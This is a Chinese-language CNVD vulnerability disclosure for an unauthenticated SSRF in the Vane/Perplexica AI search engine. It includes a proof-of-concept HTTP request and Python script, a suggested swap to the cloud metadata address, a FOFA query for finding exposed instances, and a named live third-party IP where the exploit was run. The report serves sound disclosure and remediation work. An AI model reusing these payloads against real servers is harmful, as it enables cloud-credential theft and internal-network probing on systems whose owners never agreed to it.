# 漏洞报告（中文）

> 报告编号：VUL-2026-101
> 撰写人 / 单位：{{发现者}}（CNVD 注册白帽子）
> 报告日期：2026-10-03
> 目标库：CNVD（事件型报送 + 通用型线索）

---

## 1. 产品介绍

Vane（原名 Perplexica）是开发者 ItzCrazyKns 开源的一款 AI 问答引擎（GitHub 36,700+ stars，MIT 协议），通过 SearXNG 元搜索 + 本地 Ollama 或云端大模型生成带引用来源的答案，可 Docker 一键自托管。本次漏洞位于其**模型提供商注册接口**（`POST /api/providers`），该接口默认无鉴权暴露。

## 2. 漏洞标题

Vane（Perplexica）AI 问答引擎 1.12.1 及更早版本存在未授权服务端请求伪造（SSRF）漏洞

## 3. 漏洞描述

Vane ≤1.12.1 的模型提供商注册接口 `POST /api/providers` 未做身份校验，且对用户提交的 `config.baseURL` 不做任何地址与协议校验，服务端会主动向该地址发起请求。攻击者在**无需认证、无需交互**的条件下，可迫使服务器访问其指定的任意地址（包括 127.0.0.1、内网网段、云元数据地址 169.254.169.254 等），目标响应内容还会随错误信息一并回显。该缺陷可用于内网服务探测、云元数据窃取，并以服务器为跳板对内网发起攻击。对应公开编号 CVE-2026-9372。

## 4. 漏洞分析（根因定位）

**根因类型**：CWE-918 服务端请求伪造（SSRF）

**Source-to-sink 调用链**（公开源码，见 audit-findings.md 第 2 节）：

```
POST /api providers（匿名可达，无鉴权）
  → Provider 注册处理器接收 config.baseURL
  → 服务端向 {baseURL}/api/tags 发起 fetch（无私网过滤/无协议白名单/无重定向限制）
  → JSON.parse 失败，目标响应片段被写入返回的 chatModels[].name
```

**有效性判定**：可达 ✅ / 可控 ✅ / 可传播 ✅ / 可利用 ✅ / 防护可绕过 ✅（无防护）/ 可复现 ✅ / 影响成立 ✅ / 影响范围 ⚠️（可与云元数据凭证读取组合）。

**成因分析**：注册接口本身没锁门，拿进来的 baseURL 也不验地址——私网、回环、元数据地址全都放行，取回来的内容还随手回显给调用方。三个环节每个单拎出来都不够看，连起来就是标准的未授权 SSRF。

## 5. 影响版本

- **受影响版本**：Vane（Perplexica）≤ 1.12.1（公开漏洞编号 CVE-2026-9372，2026-04 公开）
- **不受影响版本**：官方修复版本 1.12.2 及之后
- **修复版本**：1.12.2（厂商已发布）
- **验证环境**：公网实例 `http://8.159.154.189:3001`（阿里云·上海），标题 "Chat - Perplexica"，Next.js 应用，Docker 部署形态

## 6. 漏洞等级

| 项目 | 值 |
|------|-----|
| CVSS v3.1 分数 | 9.1 |
| CVSS v3.1 向量 | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:H` |
| 危害等级 | 严重（Critical） |
| 对应目标库等级 | CNVD 高危 |

> 评分依据：无需认证、网络可达、无用户交互，可读取内网与云元数据响应（C:H）、可对内部服务发起探测请求（A:H），与公开 GHSA 评估一致。

## 7. CVSS 向量

```
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:H
```

## 8. 漏洞复现过程

### 8.1 复现环境

- 产品/版本：Vane（Perplexica）≤ 1.12.1（实测实例为 2026-10-02 仍在线的旧版本实例）
- 系统/运行时：Docker（Next.js 应用，端口 3001 映射）
- 网络位置：公网（阿里云·上海）
- 测试账号：无需账号（接口未鉴权）

### 8.2 复现步骤

**步骤 1 — 访问入口**
浏览器打开 `http://8.159.154.189:3001/`，页面标题为 "Chat - Perplexica"，AI 搜索界面正常加载。
> ![步骤1](evidence/01-home.png)（录屏时截取）

**步骤 2 — 发送恶意请求**
向注册接口提交恶意 baseURL，让服务器去取 `http://www.example.com`：
```http
POST /api/providers HTTP/1.1
Host: 8.159.154.189:3001
Content-Type: application/json

{"type":"ollama","name":"cnvd-verify","config":{"baseURL":"http://www.example.com"}}
```
> ![步骤2](evidence/02-request.png)（录屏时截取）

**步骤 3 — 触发回显**
响应 200，返回体中 `chatModels[].name` 字段回显了服务器从 example.com 取回的响应片段：
```json
{"provider":{"id":"...","name":"cnvd-verify","type":"ollama",
 "config":{"baseURL":"http://www.example.com"},
 "chatModels":[{"key":"error","name":"Unexpected token '<', \"<!doctype \"... is not valid JSON"}],
 "embeddingModels":[]}}
```
`<!doctype` 片段即 example.com 首页内容，证明请求由**服务器**发出且响应被回传。
> ![步骤3](evidence/03-reflection.png)（录屏时截取）

**步骤 4 — 影响验证（可选，勿在生产实例执行）**
将 baseURL 换成 `http://169.254.169.254/latest/meta-data/` 可探测云元数据服务是否可达；换成内网地址可探测内网服务。本报告实测仅到步骤 3，未做内网探测。

## 9. 漏洞复现 POC

### 9.1 格式选择
- 选用格式：自定义脚本（单接口单请求，需精确控流与清理测试数据）
- 选择理由：需要自动清理验证时创建的 provider，自定义脚本最可控

### 9.2 运行说明
- 运行环境：Python 3 + requests
- 依赖：`pip install requests`
- **代理到 Burp**：`USE_BURP=1 BURP_PROXY=http://127.0.0.1:8080`
- 安全声明：本 POC 仅用于授权测试与漏洞验证，禁止用于未授权系统；默认只打 example.com，不内置任何内网地址。

### 9.3 POC 代码

见 `poc/verify_vane_ssrf.py`。核心请求：

```python
payload = {"type": "ollama", "name": "cnvd-verify",
           "config": {"baseURL": "http://www.example.com"}}
r = requests.post(target + "/api/providers", json=payload, ...)
# 命中判定：响应含 "Unexpected token" 且回显 "<!doctype" 片段 → SSRF 成立
# 收尾：DELETE /api/providers/{id} 清理测试数据
```

### 9.4 预期输出 / 成功判定
```
[+] SSRF CONFIRMED: server fetched external URL and reflected response content
    chatModels[0].name = "Unexpected token '<', \"<!doctype \"... is not valid JSON"
[*] cleanup: provider deleted (200)
```

## 10. 修复建议

### 10.1 临时缓解措施
- 在反向代理（nginx 等）层对 `/api/providers` 增加访问控制（仅允许管理来源 IP 或加 Basic Auth）；
- 出口防火墙限制应用容器的出向连接，禁止访问 127.0.0.0/8、10.0.0.0/8、172.16.0.0/12、192.168.0.0/16、169.254.0.0/16。

### 10.2 根治修复方案
- 升级 Vane 至 1.12.2 及以上（官方已修复 CVE-2026-9372）；
- 若自改源码：注册接口加鉴权；对 baseURL 做协议白名单（仅 https）、DNS 解析后私网地址段过滤、禁止跟随重定向；错误信息不回显目标响应内容。

### 10.3 修复验证
重放本报告 POC：修复后注册接口应拒绝匿名请求，或对内网/回环地址返回明确拒绝，不再产生对外 fetch。

## 11. 去误报说明

```
去误报核验结论：
- 存在性：✅ 公网实例稳定复现 3 次，响应一致
- 定性：✅ 构成 SSRF（CWE-918），影响机密性与可用性
- 可利用性：✅ 无需认证、无需交互、公网可达、单请求复现
- 原创性：⚠️ 该缺陷已有公开编号 CVE-2026-9372（2026-04 公开），本报告为
  「事件型」报送：实测国内公网实例仍在运行受影响版本并可被利用，
  同时佐证国内存在此类暴露资产（FOFA title="Perplexica" && country=CN 命中 30+ 实例）
- 证据：✅ 完整请求响应（evidence/http-transcript.txt）、回显片段、清理记录
- 代码级判定：✅ 公开源码核对调用链一致（接口无鉴权 + baseURL 无校验 + 错误回显）
结论：事件型漏洞属实，可提交 CNVD 事件型；同时可作 Vane 通用型漏洞国内影响佐证。
```

---

## 附录 A：参考链接 / 时间线

| 时间 | 事项 |
|------|------|
| 2026-10-03 | FOFA 测绘发现国内 30+ Perplexica/Vane 实例，筛选 CN 实例无害验证 |
| 2026-10-03 | 在阿里云·上海实例实测 SSRF 成功并固化证据，清理测试数据 |
| 2026-10-03 | 整理报告组（本目录），待录屏后提交 CNVD |

- 公开漏洞编号：CVE-2026-9372
- 参考：GitHub ItzCrazyKns/Vane issue #1124（漏洞细节与 PoC）

## 附录 B：证据清单

- [x] HTTP 请求/响应原文：`evidence/http-transcript.txt`
- [ ] 复现录屏（浏览器 + Burp 重放，发现者执行）
- [x] POC 脚本：`poc/verify_vane_ssrf.py`
- [x] 源码调用链核对：`audit-findings.md`
- [ ] FOFA 测绘截图（发现者留存）
